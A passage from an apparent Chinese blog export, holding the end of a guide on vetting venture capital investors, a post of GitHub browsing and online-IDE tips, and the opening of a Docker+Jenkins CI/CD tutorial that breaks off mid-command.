<h3 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h3><p>在签 TS 之前，要做的是识别 VC 的好坏。他们值得信赖吗？他们会积极帮助公司吗？他们善于倾听吗？他们容易相处吗？还有一个非常重要的是，他们愚蠢吗？征求投资人的对他们开展背景调查的同意。征求同意本身其实就是一种调查。有些投资人会觉得被冒犯，对此觉得反感。这种傲慢的态度对于创业者来说是一个警示信号。有些投资人则会欣然接受你对他们做背景调查，他们认为这是一个好事。这说明你在以后招聘关键人物或者是引入关键合伙人的时候，也会秉持同样谨慎的态度。不过看上去对创业者很好的 VC，不一定真正好，毕竟创业是长征。假设 VC 大笔给钱完全不管，公司黄了也不在意，对于公司创始人而言，除了在这过程中摸到一些好处到自己口袋，还能得到什么？错过时间成本，很可能拱手让出一次成就大事业的机会，等到昔日同伴占下山头，还会觉得这个 VC 很好吗？再假设 VC 在前期慈眉善目，一帆风顺，但等到后期运作时却笑里藏刀隔岸观火暗渡陈仓，把创始人轻松甩出，这样的 VC 是天使还是恶魔，看对谁而言了。</p>
<h3 id="真诚度"><a href="#真诚度" class="headerlink" title="真诚度"></a>真诚度</h3><p>说话直接, 不行就直接说不行都是好的，创业时间是最大的成本，因此投资方的坦诚接受或拒绝是很重要的品格。其他的创业者可以列自己一定不接受的价值理念，这些因人而异了。</p>
<h3 id="尊重程度"><a href="#尊重程度" class="headerlink" title="尊重程度"></a>尊重程度</h3><p>是否认为双方足够尊重彼此。心胸格局和能力往往成正比，反之则不一定。</p>
<h3 id="价值理念匹配度"><a href="#价值理念匹配度" class="headerlink" title="价值理念匹配度"></a>价值理念匹配度</h3><p>对彼此人生态度的相互欣赏。如果没有和你的投资人谈过人生、死亡、爱情、理想，那么你们的关系还差得远呢。投资人和创业者是互相尊重，互相约束，互相成长，互相理解，互相支持，互相信任的一个群体。所以基本上你作为一个创业者觉得自己跟这个投资人有以上的感觉了，那对于你这位投资人就是一个好投资人。投资人的光环不能决定他就是一位好投资人，现在被神化的一些投资人也正是当年一步一个脚印踏踏实实做好每一笔投资以后才有了今天的成绩。</p>
<h3 id="负责程度"><a href="#负责程度" class="headerlink" title="负责程度"></a>负责程度</h3><p>做事认真讲究，这点从守时、工作流程、文档、信息回复等等都可以判断，认真的投资方可能会让创业者难受和拘束，但他一定会为你负责任。</p>
<h3 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h3><p>在任何问题上都可沟通，可争论。一旦确定投资，投资人和创业者往往要在一起很多年，大家在沟通上是否平等，彼此沟通是否顺畅，是否谈得来很重要。否则，未来的七八年，和投资人沟通成为创业者的负担就痛苦了…投资人脑子应该清楚，谈话问题逻辑性强，甚至感觉谈完之后自己的 bp 很多没讲透。</p>
<h3 id="基金背景"><a href="#基金背景" class="headerlink" title="基金背景"></a>基金背景</h3><p>看 LP 的背景。如果你有渠道或者资源，最好能够去了解一下。因为 LP 很大程度上会决定这家基金的投资方向，你可以跟业内人士的投资人或者 FA 打听一下。要国内还是国外的投资，对于绝大多数创业者这二者区别不大。部分创业者有很强的开拓国外市场的需求，这时一个有境外资源的资方就会有优势；同理，国内资方在境内资源上优势就稍大一些。总体来说影响不大，无需定向寻找。</p>
<p>要拿人民币还是拿美元，先看公司上市的终极形态。当然，有时公司为了拿到钱也考虑不到终极形态的问题，但是还是要考虑到，一旦公司拿了非终极形态币种的投资，最后要付出什么样的成本：搭、拆 vie 虽然合规，但是每搭或者拆一次 vie 要 50 万元，这还是小事，公司还得花 6 个月时间等待。即使公司可以不在意 50 万元的金钱成本，6 个月的等待时间依然是得好好掂量掂量的。另一种中外合资企业，但是中外合资的问题在于：拿不到没有 ICP，这意味着公司无法进行线上交易。</p>
<p>不同的投资机构的资本背景、资金体量、投资逻辑、关注方向、投资金额、轮次、创始人特质偏好等等各不相同，所以即便你的项目很好，也不是每个投资人都会投资。比如说，有的基金原则上就不投资 A 轮以前项目，有的只投天使和 A 轮，有的只看高科技，有的只看泛娱乐。如果你有一个很棒的天使轮机器人项目，而认识的投资人只投 A 轮以后的金融项目，那么他基本上也帮不到你。</p>
<p>基金的背景。基金大致可以分成美元基金、人民币基金、产业基金、上市公司等，各种背景的投资目的、风格和偏好不太一样。比如美元基金更看重成长性，退出期较长，但拿美元公司必须有 VIE（可变利益实体，Variable Interest Entities，具体解释见什么是 VIE 结构？VIE 结构公司有何特点？）或者 JV（合资企业，Joint Venture）的架构，花费时间较长，而且费用需要公司出；上市公司战略投资为主，关注协同作用，拿了战投的钱基本就是“站队”了（此处可回答“为啥知乎不用百度搜索”），早期不太建议选战投；人民币基金较关注收入和利润。即使不能完全搞清楚基金的背景和投资偏好，也一定要知道自己需要美元还是人民币，基金能不能投相应的币种，不然完全浪费时间。</p>
<p>人民币风格基金和美元风格基金（注意，这里我们谈的是风格，不是币种），二者的差别主要是源于赚钱思路的不同：人民币风格基金更多想的是今天投了一家创业公司后，未来这家公司的利润持续增长，最终被收购掉，或者上市，基金能够赚取一二级市场的价差。由于任何一个上市公司价值都不会低于十个亿，所以就能够赚到稳定的价值；而美元基金只投行业内的第一不投第二名，原因也非常简单：看纳斯达克、上市公司数据就知道，第一第二名价差非常大，老二非死不可。</p>
<p><strong>投资人有钱，并且有继续融到钱的能力。特别是早期项目，可能需要的钱不多，看似大家都有。但是，随着公司发展，基本都会需要更多的资金投入。早期投资人会希望伴随公司多走一些路，而不是在下一轮融资就退出，所以在后续资金储备上面很重要。</strong></p>
<h3 id="职业背景"><a href="#职业背景" class="headerlink" title="职业背景"></a>职业背景</h3><p>之前的职业是做什么的，投资方向是哪个领域，对你目前所做的行业是否有过深入了解。职场履历，虽然不能直接证明一个人到底有多优秀，但是也可以侧面看出来这个人的专业度。专业投资人比较强调，我如何把这个项目贩卖给下一家 A 轮，B 轮，当然这也是非常好的，教会创业者从资本角度考虑问题。而企业家投资人，更能够关注企业本身的成长。侧重点不一样，这点谈不上谁好谁不好。看创业者自身的需要了。专业投资人一般会带给创业者，从资本角度的建议。而企业家投资人，往往带给创业者创业过程中所需要的各种经验，包括需要的各种资源。</p>
<p><strong>专业性：商业见解和逻辑性</strong>。创业者自己是专家, 很容易看出来对方是不是不懂装懂; 不懂装懂的没必要给他们上课, 上了他也学不进去。既然你是一个创业者，那么在接触投资人的时候是一定要相互交谈的，在初次交谈中，你可以获得对方给你的印象分，从心里对对方有一个最基础的评价，比如对方的言语是否真诚，对方讲话是不是很有商业见解和逻辑性，对方给你的指点是不是很有建设性，虽然有的人善于掩饰，但是在言谈举止之间，你还是可以获得一定的信息来进行一个初步的掌握的。聊天过程中一直尝试为创业者改变模式的, 也应该放弃, 他行他自己上</p>
<p>对行业的了解不仅降低沟通成本， 而且往往代表这个投资人在相关的行业里是否会带给你与一个对于你行业完全不了解的投资人打交道所花费的，远不仅仅是沟通成本，还直接影响后期他所能够为您提供的资源、甚至重要决策的支持程度等等。而且往往对你行业的了解程度也说明投资人的诚意， 好的投资人在约谈项目前，对行业有详细的调研， 去年，在我们的平台上的一个家政类项目在启动融资时，前后密集收到了十几个投资人的密集约谈，最终在基本类似的 term sheet 中，她选择了最开始聊的一位投资人，原因很简单：这位投资人在跟她谈之前，就从上海特别飞来北京，直接在她线下门店里呆了两天，跟员工聊、跟阿姨聊、跟用户聊、甚至跟小区里的住户聊，最后才约了这位创始人聊。</p>
<p>这个投资人对你所在的领域是不是真的有 insight，他和你交流的时候是胡侃还是能够有针对性的针对业务细节提问，是不是理解你的商业模式，是不是真正理解出现可能天花板的原因，如果业务上有方向的疑问，他提的问题是不是真的同解决方案有关；好的投资人如果想投一个行业，他一定会对这个行业有深入的分析和研究，正是因为他真心实意想投，所以他才会用心来看这个行业，所以他才敢果断放钱，因为他是真心想赌。</p>
<h3 id="投资成绩"><a href="#投资成绩" class="headerlink" title="投资成绩"></a>投资成绩</h3><p>是否具备同类项目成功经验，对于创业者的成功是在于项目核心优势明显，经营持续有序。如果不是同类项目，那看是否是类似模式，比如服务模式，商业模式，用户发展路径等。既然你选择自己创业，那么投资人给你的不仅仅是钱这么简单，还有投资人背后的大量资源，那么投资人的之前的一些业绩就显得特别重要了，如果他也是一个投行新人，那么恐怕他能够给你的帮助就变得小之又小了，而如果是一些有经验的，有成绩的，对你来说也会省下很多事情和麻烦，还能给予你比较大的帮助。:看看对方投的过往项目你自己认可不认可, 不认可的话也没有必要继续。看这家基金近期是否有投资案例、人员流动是否频。如果基金的投资经理离职率较高，最近又没有投出的项目，说明这家基金属于没有钱的状态，只看不投，跟他接触纯属浪费时间。</p>
<p>如果搜到一个机构已经投了十几个项目或者几十个项目，一般来说完全不靠谱的概率就会小很多，毕竟谁也不会和钱过不去，先投一堆项目故意骗人，这个逻辑是不存在的。同理，投的公司是什么公司，后面发展的如何，也可以部分验证这个机构是否和你匹配。比如一个互联网公司，发现投资机构投的都是传统行业的 PE 项目甚至 Pre-A、IPO 项目，那么就有可能不合适。再比如某机构投了几十个项目，但没有一个项目听过，也就是说项目基本都没走太远，那应该谨慎。这样的机构往往在早期投资机构中声誉不佳，这样的话你的下轮融资可能会有难度。</p>
<p>如果是中小型基金，看<strong>有没有投过类似的项目</strong>。如果有，建议不要去接触。一般来说，只有像红杉这些比较大的基金才会在同一条赛道上布很多企业。中小型基金投过一个，就不会再投其他项目了，因为这种竞争他玩不起。如果你贸然去接触，相当于把你的所有商业信息都透露给他，他可能就会反馈给他已经投过的企业。</p>
<h3 id="名气、品牌、口碑"><a href="#名气、品牌、口碑" class="headerlink" title="名气、品牌、口碑"></a>名气、品牌、口碑</h3><p><strong>投资人的人品</strong>；看看他投的 portfolio，尽量通过创业者群体，FA 等等渠道打听一下机构&#x2F;具体投资人的情况；投资人可能投的眼光对于一件事情的理解会存在差异，但是，一个靠谱的投资人无论对于创业者还是 FA，是都愿意合作的；创业者经常被直观的投资机构名气、投资人头衔所迷惑而忽略了这一点。风投机构和投资人非常注重经营自己的品牌，因为他们知道好的品牌名声可以更好地帮助他们争取项目、促成交易。但对于创业者而言，重要的不是风投机构的品牌形象，而是应该多听听他们投资的创业者对这个风投机构的看法。做投资人背景调查最好的时机是在他们向你发出了投资意向书、而你还在考虑接受与否的那段时间。不要看重投资人的名气，不要看重投资人在那时那刻对你的热情（许多投资人做商务出身的，搞定你是小菜一碟），看条款，看实际给钱速度，看服务水平。后面两条你不好判断，可以随机选两三个投资人过去投过的项目，去找 CEO，和他见见，深入聊聊。相信我，创业者都会向着创业者的，他们是真正了解这个投资人的人。一定要了解他作为投资人，在业界内的口碑如何，如果在界内很多人都反应这个人不怎么样，那么你最好就不要和他合作了（就算合作也需要小心谨慎），肯定不是你想象中的那么好，至少不适合你，如果口碑特别不错，这样你也能放心。</p>
<p>一旦建立了投资关系，投资人就上了你的贼船，你们就绑在一起了。以后有很多的风雨需要你们共同面对。这就需要你们能够同舟共济。但能否做到这一点，还要看你们的作风是否和谐。另外投资人的口碑也很重要。投资机构有没有黑历史。有没有不合理的取消过 TS，甚至取消过 SPA，打款速度如何。习惯性取消协议的机构还是慎重考虑</p>
<p><strong>那些正在处在宣传阶段的投资机构，是创业者重点考虑的对象！因为可能这些机构刚试水天使投资业务，需要打响他们的知名度，投资门槛也可能比知名的机构略低一些。</strong></p>
<p>找天使投资的时候，口碑好的一定比口碑差的强，无论口碑好的那一方面受到多少中伤，也无论口碑差的那一方发了多少正面新闻。如果一家 VC，签 TS 很快，签投资合同却要内部审核几个月；如果一家 VC 对其能够提供的帮助和资源夸张到天上；如果一家 VC 过去投资的较为成功企业（注意，不要问失败的企业）对他们的评价不高；这恐怕就不会是一家口碑好的 VC。</p>
<p>我认为不必刻意寻找<strong>明星投资人或者创业导师</strong>。因为对大多数创业者来说，像徐小平这类的投资人身价太高，议价能力太强，创业者很可能被迫出让过多股份或只能得到少量投资。而且他们公务繁忙，很难静下心来对一个项目进行指导；他们的资源也很难向众多拥护者开放。不过，如果明星资方主动找到你，你们谈判的结果又令人满意，那自然可以接受：否则的话，也不必可以寻找，其他的投资人也是不错的选择。</p>
<p><strong>大公司投资</strong>他们的资源极多，远胜于一般的投资人。如果你担心人才收购或野蛮并购，我只能很遗憾地说，如果 BAT 相中了你，有些结果是很难避免的。BAT 相中你说明你的项目或团队有价值，客观来讲这是一件好事。但初创公司在创业的前两三个 18 个月内，都不应该让大公司以控股方式进来，除非双方业务的协同性是天然的难以分割的，但往往这种情况就是大公司内部孵化了，也轮不到初创团队去做了不是？！</p>
<h3 id="对你项目的重视程度"><a href="#对你项目的重视程度" class="headerlink" title="对你项目的重视程度"></a>对你项目的重视程度</h3><p><strong>时间：</strong>愿意和你聊的久的, 只要不是没事干那你消遣的，剩下都是相对友好的。热情是投资人一直强调创业者要具有的品质。 投资人本身对于你这个项目的热情，决定了在后期这个投资人能多大程度上帮扶你的项目、为你提供资源。坦白讲，对于早期项目来说，投资的金额并不大，资金本身很多时候不足以成为投资人一直关注你这个项目的原因。但是兴趣和热情可以。另外， 热情也是投资人在你项目发展困难的时候，对你持续保持信心的基础。当然，对于投资人的热情也需要认真分辨。如果这个投资人做决策时间特别短，例如，直接在某个场合高调宣布投资多少，那么创业者也要很谨慎。因为这类 激情决策”，很常发生的事情就是，后期的 term 会很严苛，严苛到创业者不得不知难而退。</p>
<h3 id="打款速度：出钱快不快"><a href="#打款速度：出钱快不快" class="headerlink" title="打款速度：出钱快不快"></a>打款速度：出钱快不快</h3><p>项目早期发展的时间窗口非常重要，那么资金及时到位的重要性也不言而喻。这里要提醒创业者警醒的是某些“出钱不快”的做法。这方面个人天使往往占优势， 不想基金有各种审核流程，有的甚至协议签署之后再到 LP 那里报批， 时间就会拖得很久。在接受 Term 时， 创业者应该特别关注基金在打钱之前的流程。 Term Sheet 后到打钱之间的时间。 再次强调因为基金管理别人的钱， 和天使投资人投资自己的钱不一样， 后者的流程（如果有的话）， 会快很多！</p>
<p>关于打款磨叽不磨叽的问题需要提前打听好，可能有投资人给 TS 快，但是不一定打款快，这个问题不仅创业者会遇到，FA 也会遇到。</p>
<h3 id="投资人对你的要求"><a href="#投资人对你的要求" class="headerlink" title="投资人对你的要求"></a>投资人对你的要求</h3><p>投资人把那么多钱投进来，不是什么都不管的，会附带很多的条件和要求（比如对赌）。这些一般都体现在投资条款中，你需要将一些要害的问题了解清楚，做到心中有数。</p>
<p>投资人是不是战略投资者</p>
<p>风险投资人一般只做财务投资，只是想通过投资你的企业实现资本增值，而对掌控企业没有兴趣。但如果你碰到的是战略投资者，那其诉求就不只是挣钱，可能还会有其他的目的。对此，必须了解清楚。</p>
<p><strong>投资决策风格</strong>如何：趋于保守还是趋于激进，创业者项目目前如果风险较大，存在较多不确定性，你就别浪费时间找只投 C 轮之后或者总是跟投的。是聚焦投一两个领域还是什么领域都投，懂行的投你的概率低，投资方主要看赛道，很容易强者恒强，放弃弱者；什么领域都投的可能相对容易决策，但是后期能力上对你没什么帮助。决策流程是长还是短，也要根据融资的紧迫性来选择。</p>
<p><strong>投后管理风格</strong>：是严格管控还是自身自灭，也得结合自身能力去匹配。这一点除了问，最好能在投资方已经投过的项目去接触创业者了解下。</p>
<h3 id="干预度：添不添乱"><a href="#干预度：添不添乱" class="headerlink" title="干预度：添不添乱"></a>干预度：添不添乱</h3><p>投资人都会对于项目的发展提出商务梳理等建议， 这也是投后管理的一部分。 但是，一个不添乱的投资人要谨守的是：可以给建议， 但最终会支持你的决策。他的建议只是参考答案， 而不是标准答案。 这些立场，需要在前期沟通的时候，达成共识。</p>
<h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>你需要询问投资人的在投企业，如果他已经投过你的竞品，就不要再接受他的投资了。一般的个人资方不会干<strong>窃取商业机密</strong>这种缺德的事情，但是 VC 等机构可能会，幸好 VC 的投资记录比较容易查到，你可以避免脚踏两只船的情况。另一种可行的方法是借力天使汇 AngelCrunch 等平台，平台的服务会帮你绕过一些潜在危险，更大的后盾也能帮你更好地维护合法权益。 创始人会担心投过竞争对手的基金会向竞对泄密（不排除这种可能性），而有的机构确实是“投选手”，即同一类型的公司只投一家。而另外有些机构，是以“投赛道”著称，这样的机构在同一领域布局很多家公司，所以投过竞对关系也不大。所以创业者在考虑这个问题的时候要从不同角度考量。</p>
<p><strong>投资人曾经把创始人踢出团队怎么办？</strong>我的建议是了解故事的始末，如果很难通过其他渠道了解，就和投资人聊聊这件事。如果他踢掉的创始人真的自身存在问题，并且被踢掉创始人的企业现在比以前更健康，这种行为就是理性且可以原谅的。如果那家企业现在分崩离析，你就要警惕了。不要接受奸雄的投资，那是潜在的危机。</p>
<p><strong>尽量不要签署什么“期间不得接触其他投资机构”这类的保密\排他协议。否则选择了一家风投，基本上就是拒绝了其他风投，意味着你实际上是放弃了其他潜在的机会。意味着你对其他风投关上了大门。所以，你最好要确信自己找到的是最好的投资才能签，否则很可能会失去获得更大投资的机会。除非你已经别无选择。</strong></p>
<h3 id="能否帮上忙"><a href="#能否帮上忙" class="headerlink" title="能否帮上忙"></a>能否帮上忙</h3><p>如果投资人了解你所处的行业，对你做的事情很赞同，并且有较多的行业资源人脉，甚至在一些经验和某些角度对你所做的事情提出不同的有深度的见解，即便只是仅供参考，那对创业者就是赚了。资源落实的问题还是看机构和人的执行力。有一些 VC，会耍些手段，有些算盘，但最起码他们会帮公司做大（虽然也是为了自己赚钱），这就需要 VC 方面也足够聪明。只会给钱的煤老板是完全帮不到公司的，这是一个很简单的事实，但很多创业者认识不到，这是因为想着赚眼前的钱而不是做大。诚然，并不是每个创业者都有远大理想。</p>
<h3 id="推动你案子的动力和能力"><a href="#推动你案子的动力和能力" class="headerlink" title="推动你案子的动力和能力"></a>推动你案子的动力和能力</h3><p>看你案子的人可能是投资经理，可能是 VP，也可能是合伙人，but，每个人对于你案子的推动力是不一样的。可能有些投资经理虽然 title 低，但是因为经常在一线跑，对于某些行业理解比合伙人深，知道你的状态好是坏，要是认同你，就会重视你，因此才会玩儿命 sourcing，然后向合伙人在投委会过会时候推荐你；有时候则需要找到 title 更高一点的人帮助你，这些情况其实是需要看每个基金每个投资人而定的，不能一概而论；纠正一个误区，有些创业者认为，跟基金谈，就要见合伙人，什么投资经理分析师 VP 的，反正不能拍板，见了是浪费时间。其实这么想有些片面。最理想的人选是基金里懂这个领域并且推动力强的人，可以是投资经理甚至分析师。相当一部分 VC 机构投资部都 10 人左右，扁平化管理，任何人都可以推项目给合伙人。如果合伙人不懂这个领域，上来就见合伙人，没有引起他的兴趣，等于浪费了这个机构的机会；远不如先找个懂行的投资经理一起揣摩项目，让他为你背书再推荐给合伙人的效果好。</p>
<h3 id="能否共度难关"><a href="#能否共度难关" class="headerlink" title="能否共度难关"></a>能否共度难关</h3><p>是不是在发展过程中不给你添堵，这点其实不好判断，毕竟需要融资的时候，每个创业者急迫程度不一样，有的可能处于高点，有的可能处于发展中的低点。投资人拿真金白银来投你就是为了高额回报。所以，投资人同创业者交流的时候，创业者也可以抓住机会多问问题。这个问题引申出来的小问题就是投资人会不会在一些条款小细节为难你。TS 暗藏玄机的时候，投资人肯定和你的认知是有偏差的。</p>
<h3 id="投资人给你的资源"><a href="#投资人给你的资源" class="headerlink" title="投资人给你的资源"></a>投资人给你的资源</h3><p>最好写下来，要让他给你落到实处。好的投资人是真的会帮你介绍许多牛人，帮你解决麻烦的。这里特别提示：那种动不动就说“你说那 XXX 啊，和我太熟了，让他拉你一把”的投资人，你要分辨：</p>
<p>如果他说的“XXX”是大佬，那么这个投资人大体是在利用大佬来抬高自己，真实情况可能是他不自信，他觉得自己没有真才实学，所以需要狐假虎威；</p>
<p>如果他说的“XXX”是下面办事的，而且他能说出很多个，那这个投资人可能真的为他的公司做了很多实际的事情，这样的人你一定要珍惜。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>独立判断。任何投资人都不可能获得 100%的正面评价。如果你的调查中没有取得丝毫的负面评价，那么这说明你的调查工作并没做到位。绝大多数的风险投资项目最终都是失败的。有些创业项目因鲁莽的业务重组而失败，有些则是因为资金流断裂而失败。创业项目失败会让人们的情绪变得偏激。这时你要能够去其糟粕取其精华，尽可能还原事实真相。当你获得了一些对投资人的负面评价时，你最好也听听投资人的说辞。兼听则明，偏信则暗，只有这样你才能做出更准确的判断。</p>
<p>有能力问最基本的问题是最重要的学习能力，很多东西我们几乎没经历过，只能站在经历者的肩膀上提炼，升华！</p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>投资理财</tag>
      </tags>
  </entry>
  <entry>
    <title>github使用技巧</title>
    <url>/2022/05/10/20220510-github%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220510072148793.png" alt="image-20220510072148793"></p>
<span id="more"></span>

<h2 id="1-在线查看项目"><a href="#1-在线查看项目" class="headerlink" title="1 在线查看项目"></a>1 在线查看项目</h2><h3 id="1-1-直接在-github-后面加上-1s"><a href="#1-1-直接在-github-后面加上-1s" class="headerlink" title="1.1 直接在 github 后面加上 1s"></a>1.1 直接在 github 后面加上 1s</h3><p>找到需要看的项目的 github 地址。比如：antd-design pro</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://github.com/ant-design/ant-design-pro</span><br></pre></td></tr></table></figure>

<p>只需要在地址 github 后面加上<code>1s</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://github1s.com/ant-design/ant-design-pro</span><br></pre></td></tr></table></figure>

<p>与 vs-code 基本一样，速度很快！再也不用担心 github 网速慢的问题了。</p>
<p><img src="https://cdn.huatree.top/image-20220510053731103.png" alt="image-20220510053731103"></p>
<h3 id="1-2-github-加前缀-vscode-dev-x2F"><a href="#1-2-github-加前缀-vscode-dev-x2F" class="headerlink" title="1.2 github 加前缀 vscode.dev&#x2F;"></a>1.2 github 加前缀 vscode.dev&#x2F;</h3><p><code>vscode.dev/</code>方式打开时，需要 github 在线授权</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://vscode.dev/github.com/ant-design/ant-design-pro</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20220510054828459.png" alt="image-20220510054828459"></p>
<h3 id="1-3-github-的后缀-com-换成-dev"><a href="#1-3-github-的后缀-com-换成-dev" class="headerlink" title="1.3 github 的后缀.com 换成.dev"></a>1.3 github 的后缀.com 换成.dev</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://github.dev/ant-design/ant-design-pro</span><br></pre></td></tr></table></figure>

<p><strong>快捷键</strong>：在原<code>https://github.com/ant-design/ant-design-pro</code>地址下，按下键盘上的<code>.</code>键位，可快速在线打开项目。</p>
<p><img src="https://cdn.huatree.top/image-20220510055416674.png" alt="image-20220510055416674"></p>
<h3 id="1-4-通过-Chrome-插件-Octotree-GitHub-code-tree"><a href="#1-4-通过-Chrome-插件-Octotree-GitHub-code-tree" class="headerlink" title="1.4 通过 Chrome 插件 Octotree - GitHub code tree"></a>1.4 通过 Chrome 插件 Octotree - GitHub code tree</h3><p><img src="https://cdn.huatree.top/image-20220510055737787.png" alt="image-20220510055737787"></p>
<h2 id="2-在线运行项目"><a href="#2-在线运行项目" class="headerlink" title="2 在线运行项目"></a>2 在线运行项目</h2><p>在项目地址前加上 <code>gitpod.io/#</code> 前缀，此时，可以选择 github 授权。等待几秒钟，它会自动识别项目的类型，并在线安装项目所需的依赖，并打好包。</p>
<p>例如 vue 项目，gitpod 环境下，会当前项目根目录下创建默认配置<code>.gitpod.yml</code>文件。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This configuration file was automatically generated by Gitpod.</span></span><br><span class="line"><span class="comment"># Please adjust to your needs (see https://www.gitpod.io/docs/config-gitpod-file)</span></span><br><span class="line"><span class="comment"># and commit this file to your remote git repository to share the goodness with others.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tasks:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">init:</span> <span class="string">yarn</span> <span class="string">install</span> <span class="string">&amp;&amp;</span> <span class="string">yarn</span> <span class="string">run</span> <span class="string">build</span></span><br></pre></td></tr></table></figure>

<h3 id="Invalid-Host-header-问题解决"><a href="#Invalid-Host-header-问题解决" class="headerlink" title="Invalid Host header 问题解决"></a>Invalid Host header 问题解决</h3><p><strong>出现该问的原因</strong>：因为新版的 webpack-dev-server 出于安全考虑，默认检查 hostname，如果 hostname 不是配置内的就不能访问。</p>
<p><strong>解决办法：</strong>设置跳过 host 检查。打开你的项目全局搜索 devServer ，在 devServer 里面添加 <code>disableHostCheck: true,</code></p>
<p>disableHostCheck 设置为 true 的意思就是设置跳过 host 检查。</p>
<div class="note success"><p>本地运行项目的操作，gitpod 环境下同样适用。</p>
</div>

<div class="note warning"><p>Gitpod 免费版支持：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 50 小时&#x2F;月</li>
<li><input checked="" disabled="" type="checkbox"> 公共和私人回购</li>
<li><input checked="" disabled="" type="checkbox"> 4 个并行工作区</li>
<li><input checked="" disabled="" type="checkbox"> 30 分钟不活动超时</li>
</ul>
</div>

<h2 id="3-项目推送"><a href="#3-项目推送" class="headerlink" title="3 项目推送"></a>3 项目推送</h2><p>在 GitHub 的 Explorer 探索页面中，有一个非常不起眼的按钮，“获取邮件更新”。</p>
<p>我们可以根据自己的喜好，让 GitHub 定期给我们推送自己感兴趣的优质项目，就可以持续扩大知识面、了解开源动态啦。</p>
<p><img src="https://cdn.huatree.top/image-20220510065320331.png" alt="image-20220510065320331"></p>
<h2 id="4-文件定位查看"><a href="#4-文件定位查看" class="headerlink" title="4 文件定位查看"></a>4 文件定位查看</h2><p>刚开始的时候，相信大多数同学是一级一级的点击项目目录去找文件，发现位置错了后呢，还要回到最初的起点，呆呆地再换一个目录去找。</p>
<p><img src="https://cdn.huatree.top/image-20220510070107485.png" alt="image-20220510070107485"></p>
<p>后来在<a href="https://docs.github.com/cn/get-started/using-github/keyboard-shortcuts">github 官方文档</a>中发现，我们只需按下 <code>t</code> 键，就可以快速、实时地对仓库内的所有文件进行搜索。</p>
<p><img src="https://cdn.huatree.top/image-20220510070309131.png" alt="image-20220510070309131"></p>
<p>点进某个文件后，还有技巧，按下 <code>L</code> 键，就可以快速跳转到某一行。</p>
<p><img src="https://cdn.huatree.top/image-20220510070554922.png" alt="image-20220510070554922"></p>
<p>点击行号，就可以快速复制这行的代码，生成永久链接。</p>
<p><img src="https://cdn.huatree.top/image-20220510070627257.png" alt="image-20220510070627257"></p>
<p>按 <code>b</code> 键还可以快速查看该文件的改动记录。</p>
<p><img src="https://cdn.huatree.top/image-20220510070756051.png" alt="image-20220510070756051"></p>
<p>除了上面这些，GitHub 里还隐藏了许多实用的<a href="https://docs.github.com/cn/get-started/using-github/keyboard-shortcuts">快捷键</a>，大家可以在官方文档尽情查看。</p>
<h2 id="5-过滤搜索"><a href="#5-过滤搜索" class="headerlink" title="5 过滤搜索"></a>5 过滤搜索</h2><p>使用 GitHub <a href="https://docs.github.com/cn/search-github/getting-started-with-searching-on-github/about-searching-on-github">高级搜索</a>功能提供的 <code>搜索限定符</code>。进入 advance search 界面（搜索结果页左下角），利用可视化表单也能实现高级搜索。但这个界面展示的搜索条件有限，其实还有更多的搜索限定语法，比如按代码库名称、描述搜索，对仓库中的内容进行搜索等，这些都可以在 GitHub 官方文档查阅。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://mp.weixin.qq.com/s/P7odF1arZ1siCKvhwp6fqA">GitHub 这 5 个骚操作，99%的人不知道！</a></p>
<p>[2] <a href="https://code.visualstudio.com/blogs/2021/10/20/vscode-dev">vscode.dev</a></p>
<p>[3] <a href="https://www.gitpod.io/">Gitpod</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker+Jenkins+GitHub</title>
    <url>/2022/05/14/20220514-Docker%20+%20Jenkins%20+%20GitHub/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220511175224561.png" alt="image-20220511175224561"></p>
<span id="more"></span>

<div class="note warning"><p>本文教程基于<strong>Windows 10 系统</strong>Docker+Jenkins+GitHub 实现 CI&amp;CD。</p>
</div>

<h2 id="在-Docker-中运行-Jenkins"><a href="#在-Docker-中运行-Jenkins" class="headerlink" title="在 Docker 中运行 Jenkins"></a>在 Docker 中运行 Jenkins</h2><p>将 Jenkins 作为 Docker 容器并从 <a href="https://hub.docker.com/r/jenkinsci/blueocean/"><code>jenkinsci/blueocean</code></a> Docker 镜像中运行。</p>
<h3 id="使用-Docker-Engine-运行-Jenkins"><a href="#使用-Docker-Engine-运行-Jenkins" class="headerlink" title="使用 Docker Engine 运行 Jenkins"></a>使用 Docker Engine 运行 Jenkins</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入cmd终端</span></span><br><span class="line"><span class="comment"># 查看当前wsl版本</span></span><br><span class="line">wsl -l -v</span><br><span class="line"><span class="comment"># 进入wsl</span></span><br><span class="line">wsl</span><br><span class="line"><span class="comment"># 使用下面的 docker run 命令运行 jenkinsci/blueocean 镜像作为Docker中的一个容器(记住，如果本地没有镜像，这个命令会自动下载)</span></span><br><span class="line">docker run \</span><br><span class="line">  --name huatree-jenkins \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  --restart \</span><br><span class="line">  -u root \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  -v jenkins-data:/var/jenkins_home \</span><br><span class="line">  -v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">  -v /home/huatree/document:/home \</span><br><span class="line">  jenkinsci/blueocean</span><br><span 